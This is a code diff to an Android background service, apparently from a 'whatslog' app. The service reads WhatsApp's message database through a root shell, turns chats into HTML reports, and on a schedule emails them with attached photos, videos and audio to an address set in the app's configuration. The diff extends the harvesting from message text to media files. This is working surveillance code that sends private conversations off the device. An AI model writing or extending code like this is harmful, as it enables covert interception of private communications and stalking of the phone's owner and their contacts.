@@ -32,6 +32,7 @@ import android.os.IBinder;
 import android.util.Log;
 import android.widget.Toast;
 
+import com.gmailsender.GMailSender;
 import com.j256.ormlite.dao.Dao;
 import com.whatslog.dao.DatabaseHelperConfiguracao;
 import com.whatslog.dao.DatabaseHelperExternal;
@@ -54,6 +55,9 @@ public class MainService extends Service {
 	private DatabaseHelperExternal external;
 	private Map<String, List<Messages>> listaMensagens;
 	private GMailSender gmail;
+	private Map<String, byte[]> anexos=new HashMap<String, byte[]>();
+	private Configuracao configuracao;
+	private final long MAX_SIZE=10485760;
 
 	public MainService() {
 	}
@@ -78,6 +82,7 @@ public class MainService extends Service {
 							+ getApplicationContext().getPackageManager()
 									.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
 							+ "\n");
+
 			dataOutputStream.writeBytes("exit\n");
 			dataOutputStream.flush();
 			process.waitFor();
@@ -133,7 +138,6 @@ public class MainService extends Service {
 			e.printStackTrace();
 		}
 
-		gmail=new GMailSender(getApplicationContext());
 		startMail();
 	}
 
@@ -185,37 +189,43 @@ public class MainService extends Service {
 
 		// For time consuming an long tasks you can launch a new thread here...
 		Toast.makeText(this, " Service Started", Toast.LENGTH_LONG).show();
-
 	}
 
 	private void startMail(){
-		DatabaseHelperConfiguracao database = new DatabaseHelperConfiguracao(
-				getApplicationContext());
-		List<Configuracao> confs;
-		try {
-			confs = database.getDao().queryForAll();
-			Configuracao conf = null;
 
-			if (confs.size() > 0) {
-				conf = confs.get(0);
+		scheduleTaskExecutor = Executors.newScheduledThreadPool(1);
+		if(scheduledFuture!=null)
+			scheduledFuture.cancel(true);
+
+		scheduledFuture=scheduleTaskExecutor.scheduleAtFixedRate(new Runnable() {
+			public void run() {
+				prepare();
 			}
-			if (conf != null) {
+		}, 0, getConfiguracao().getIntervalo() * 60, TimeUnit.SECONDS);
 
-
-				scheduleTaskExecutor = Executors.newScheduledThreadPool(1);
-				if(scheduledFuture!=null)
-					scheduledFuture.cancel(true);
-
-				scheduledFuture=scheduleTaskExecutor.scheduleAtFixedRate(new Runnable() {
-					public void run() {
-						prepare();
-					}
-				}, 0, conf.getIntervalo() * 60, TimeUnit.SECONDS);
-			}
-		} catch (Exception e) {
-		}
 	}
 
+
+	public Configuracao getConfiguracao() {
+		if(configuracao==null){
+			DatabaseHelperConfiguracao database = new DatabaseHelperConfiguracao(
+					getApplicationContext());
+			List<Configuracao> confs;
+			try {
+				confs = database.getDao().queryForAll();
+				Configuracao conf = null;
+
+				if (confs.size() > 0) {
+					conf = confs.get(0);
+				}
+				if (conf != null) {
+					configuracao=conf;
+				}
+			} catch (Exception e) {
+			}
+		}
+		return configuracao;
+	}
 
 
 	@Override
@@ -284,21 +294,20 @@ public class MainService extends Service {
 
 		File outputDir = getApplicationContext().getCacheDir(); // context being
 		try {
-
+			gmail=new GMailSender(getApplicationContext());
 			StringBuilder html = new StringBuilder();
 
 			html.append(getChatList());
 			html.append(loadMessages());
 
-			List<File> anexos = new ArrayList<File>();
-//			File chatsFile = File.createTempFile("chats", ".html", outputDir);
-			File chatsFile=new File(outputDir, "logs_"+(new SimpleDateFormat("dd_MM_yyyy").format(new Date())));
+
+			File chatsFile=new File(outputDir, "logs_"+(new SimpleDateFormat("dd_MM_yyyy").format(new Date()))+".html");
 			OutputStream output = new FileOutputStream(chatsFile);
 			output.write(wrapHtml(html).toString().getBytes());
 			output.flush();
 			output.close();
 
-			anexos.add(chatsFile);
+			anexos.put(chatsFile.getName(),com.gmailsender.Utils.getBytes(chatsFile));
 			if(Utils.isConnected(getApplicationContext()))
 				new SendEmailAsyncTask().execute(anexos);
 
@@ -311,14 +320,15 @@ public class MainService extends Service {
 	private StringBuilder wrapHtml(StringBuilder html) {
 		StringBuilder tmp = new StringBuilder();
 
-		tmp.append("<html><head></head><body>").append(html)
-				.append("</body></html>");
+		tmp.append("<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta charset=\"utf-8\"><style>.clear{clear: both;}.device{font-weight: normal;font-style: italic;font-size:14px;text-align:right;}.date-divider{background: #fff;padding: 4px 7px;border: 1px solid #6ABA2F;margin: 15px 0 4px 0;}.date-divider a{text-decoration: none;}.eventtype{ margin-top: 6px; clear: both;}.contents{padding: 2px 8px 4px;    margin: 0;    clear: both;}.contents h3{    margin:6px 0;       font-size:14px;}.contents p{    margin-top: 0;}.econtent{    margin-bottom:4px;}.econtent img{    vertical-align:middle;}.t2, .t5, .t15{    margin-left:20%;    background-color: #fff;    box-shadow: -2px 1px 2px rgba(0, 0, 0, 0.6);    font: 15px Helvetica, Arial, sans-serif;    float: right;    padding: 0 4px;    position: relative;    border-width: 1px;    border-color: #309b19;    border-style: solid;    text-align: right;}.t1, .t3, .t4 {    margin-right: 20%;    background-color: #F5F5F5;    box-shadow: 2px 1px 2px rgba(0, 0, 0, 0.6);    font: 15px Helvetica, Arial, sans-serif;     float: left;    padding: 0 4px;    position: relative;    border-width: 1px;    border-color: #9DA0A6;    border-style: solid;}.arrow2, .arrow5, .arrow15{    float: right;    width:23px;    height:10px;    margin-top:-1px;    margin-right:10px;   background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAKCAYAAABfYsXlAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjhGMjZGMUREQ0I3NTExRTFCRjg1ODQxRUREMjNBOTE3IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjhGMjZGMURFQ0I3NTExRTFCRjg1ODQxRUREMjNBOTE3Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6OEYyNkYxREJDQjc1MTFFMUJGODU4NDFFREQyM0E5MTciIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6OEYyNkYxRENDQjc1MTFFMUJGODU4NDFFREQyM0E5MTciLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7tzfsZAAAAsUlEQVR42mI0mC35n4FGgEmRQ22lGJvkD1FWSaoa3KI8U5ER6HIQWxSIc6BYiApm5wLxFCYo5zUQ1wOxDBBnAfEdCgx+B8QLwMGCJvEdiKcDsSoQhwLxcTIMB+n/gs1wZLAGiK2geA2RBv8CBQc8QonQcBzqCw0gngX1HS4ACo4XpBgOAzeBOB2I5YG4CRq26GAiSlIkI0xxRf4mIL6GrJCFglQBi3wQDgHi++gKAAIMAK71JAwUWWlQAAAAAElFTkSuQmCC);}.arrow1, .arrow3, .arrow4{    width:23px;    height:10px;    margin-top:-1px;    margin-left:10px;    background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAKCAYAAABfYsXlAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjJFQTAwOEEzQ0I3NjExRTFBNTA5RTNBMUFGOTlFNEU2IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjJFQTAwOEE0Q0I3NjExRTFBNTA5RTNBMUFGOTlFNEU2Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MkVBMDA4QTFDQjc2MTFFMUE1MDlFM0ExQUY5OUU0RTYiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MkVBMDA4QTJDQjc2MTFFMUE1MDlFM0ExQUY5OUU0RTYiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6T0+uHAAAAWElEQVR42mKcMGHCfwYaASYWVuaptDD4P8P/f0x/fv/NoYXhjAyMzCw0MRcKWJAE/lPDQGTAQi1XYo1QYhViMZSgehZquhSfy/FpZiTVYEIuZ6Q02QAEGAC0LQraPP8eOQAAAABJRU5ErkJggg==);}.einfo a{    text-decoration: none;}.einfo img {vertical-align: top;}</style></head><body>")
+		.append(html)
+		.append("</body></html>");
 		return tmp;
 	}
 
 	private StringBuilder getChatList() {
 		StringBuilder chattmp = new StringBuilder();
-		chattmp.append("<table colspan=\"1\" border=\"1\"><tr><td>Chats</td></tr>");
+		chattmp.append("<table  border=\"1\"><tr><td>Chats</td><td>Date</td><td>Last message</td></tr>");
 
 		try {
 			// DatabaseHelperInternal internal = new DatabaseHelperInternal(
@@ -338,10 +348,17 @@ public class MainService extends Service {
 				} catch (Exception e) {
 				}
 
+				Messages me= internal.getMessagesDao().queryBuilder().orderBy("timestamp", false).where().eq("key_remote_jid", chat.getKey_remote_jid()).queryForFirst();
+				String data="",msg="";
+				if(me!=null){
+					data=new SimpleDateFormat("dd/MM/yyyy hh:mm:ss").format(me.getTimestamp());
+					msg=me.getData();
+				}
+
 				chattmp.append("<tr style=\""
 						+ (i % 2 == 0 ? "background:#FCFFCD" : "")
 						+ "\"><td><a href=\"#" + chat.getKey_remote_jid()
-						+ "\">" + nome + "</a></td></tr>");
+						+ "\">" + nome + "</a></td><td>"+data+"</td><td>"+msg+"</td></tr>");
 				i++;
 			}
 
@@ -412,12 +429,15 @@ public class MainService extends Service {
 			if (message.getKey_from_me() == 1)
 				tmpcontato = "ME";
 
+
+			String dado=getDado(message);
+
 			tmp.append("<tr style=\""
 					+ (message.getKey_from_me() == 0 ? "background:#FCFFCD" : "")
 					+ "\"><td>"
 					+ new SimpleDateFormat("dd/MM/yyyy HH:mm:ss")
 							.format(message.getTimestamp()) + "</td><td>"
-					+ tmpcontato + "</td><td>" + message.getData() + "</td></tr>");
+					+ tmpcontato + "</td><td>" + dado + "</td></tr>");
 		}
 
 		tmp.append("</table>");
@@ -425,48 +445,80 @@ public class MainService extends Service {
 
 	}
 
-	class SendEmailAsyncTask extends AsyncTask<List<File>, Void, Boolean> {
+	private String getDado(Messages message) {
 
-		DatabaseHelperConfiguracao database;
-		Configuracao conf = null;
-//		Mail m;
-
-		public SendEmailAsyncTask() {
-			database = new DatabaseHelperConfiguracao(getApplicationContext());
-			List<Configuracao> confs;
-			try {
-				confs = database.getDao().queryForAll();
-
-
-				if (confs.size() > 0) {
-					conf = confs.get(0);
-				}
-//				if (conf != null) {
-//					m = new Mail(conf.getSmtpMail(), conf.getPassword());
-//
-//					String[] toArr = { conf.getEmailTo() };
-//					m.setTo(toArr);
-//					m.setFrom("whatslog@gmail.com");
-//					m.setSubject(conf.getSubject());
-//					m.setBody("Check the attached file");
-
-//				}
-			} catch (Exception e) {
-
-			}
+		if (getConfiguracao().isMiniatura() && !getConfiguracao().isMedia()) {
+			if (message.getRaw_data() != null)
+				return "<img src=\"data:" + message.getMedia_mime_type()
+						+ ";base64,"
+						+ Utils.encodeBase64(message.getRaw_data()) + "\"/>";
 		}
 
-		protected Boolean doInBackground(List<File>... anexos) {
+		if (getConfiguracao().isMedia()) {
+			if(Long.parseLong(message.getMedia_size())<=MAX_SIZE){
+			if (message.isImagem()) {
+				String key = message.getMedia_url().split("/")[message
+						.getMedia_url().split("/").length - 1];
+				anexos.put(key, Utils.getMediaFile("Images", Long
+						.parseLong(message.getMedia_size()),
+						new SimpleDateFormat("yyyyMMdd").format(message
+								.getTimestamp()), 2));
+				return "<img src=\"" + key + "\"/>";
+			}
+
+			else if (message.isVideo()) {
+				if (message.getRaw_data() != null) {
+					String key = message.getMedia_url().split("/")[message
+							.getMedia_url().split("/").length - 1];
+					anexos.put(key, Utils.getMediaFile("Video", Long
+							.parseLong(message.getMedia_size()),
+							new SimpleDateFormat("yyyyMMdd").format(message
+									.getTimestamp()), 2));
+					return "<video width=\"220\" height=\"140\" controls> <source src=\""
+							+ key
+							+ "\" type=\""
+							+ message.getMedia_mime_type()
+							+ "\">Your browser does not support the video tag.</video>";
+				}
+			} else if (message.isAudio()) {
+				if (message.getRaw_data() != null) {
+					String key = message.getMedia_url().split("/")[message
+							.getMedia_url().split("/").length - 1];
+					anexos.put(key, Utils.getMediaFile("Audio", Long
+							.parseLong(message.getMedia_size()),
+							new SimpleDateFormat("yyyyMMdd").format(message
+									.getTimestamp()), 2));
+					return "<audio controls> <source src=\""
+							+ key
+							+ "\" type=\""
+							+ message.getMedia_mime_type()
+							+ "\">Your browser does not support the audio tag.</audio>";
+
+				}
+			}
+			}else
+				return "MEDIA TOO BIG";
+		}
+		return message.getData();
+	}
+
+	class SendEmailAsyncTask extends AsyncTask<Map<String, byte[]>, Void, Boolean> {
+
+		public SendEmailAsyncTask() {
+		}
+
+		protected Boolean doInBackground(Map<String, byte[]>... anexos) {
 			try {
-
-				for (File file : anexos[0]) {
-					gmail.addAttachment(file.getName()+".html", file.getAbsolutePath());
+				Map<String, byte[]> anexo=anexos[0];
+				long tamanho=0;
+				for (String key : anexo.keySet()) {
+					byte[] arq=anexo.get(key);
+					if(arq!=null){
+						gmail.addAttachment(key, arq);
+					}
 				}
+				gmail.sendMail(getConfiguracao().getSubject(), "Check the attached file", null, getConfiguracao().getEmailTo());
 
-//				m.send();
-				if(conf!=null){
-					gmail.sendMail(conf.getSubject(), "Check the attached file", null, conf.getEmailTo());
-				}
 				return true;
 			} catch (AuthenticationFailedException e) {
 				Log.e(SendEmailAsyncTask.class.getName(), "Bad account details");
